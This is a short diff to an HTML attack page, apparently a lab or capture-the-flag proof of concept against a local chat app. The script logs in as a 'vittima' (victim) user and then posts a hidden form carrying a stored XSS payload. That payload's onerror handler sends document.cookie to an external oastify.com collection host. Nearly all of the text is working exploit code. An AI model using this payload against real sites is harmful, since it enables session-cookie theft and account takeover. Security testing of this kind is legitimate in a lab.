@@ -3,6 +3,7 @@
 <body>
 <div class="message">x</div>
 <script>
+// Step 1: Login
 fetch('http://localhost:8000/login', {
   method: 'POST',
   credentials: 'include',
@@ -10,7 +11,17 @@ fetch('http://localhost:8000/login', {
   headers: {'Content-Type': 'application/x-www-form-urlencoded'},
   body: 'username=vittima3&password=vittima3'
 }).then(() => {
-  window.location = 'http://localhost:8000/chat/70';
+  // Step 2: Inietta XSS via form submit (non fetch)
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'http://localhost:8000/chat/70';
+  var input = document.createElement('input');
+  input.type = 'hidden';
+  input.name = 'message';
+  input.value = '<img src=x onerror="fetch(\'https://d2ghgjts3mukt4luqn2sm92plgr7fz3o.oastify.com/?c=\'+document.cookie)">';
+  form.appendChild(input);
+  document.body.appendChild(form);
+  form.submit();
 });
 </script>
 </body>
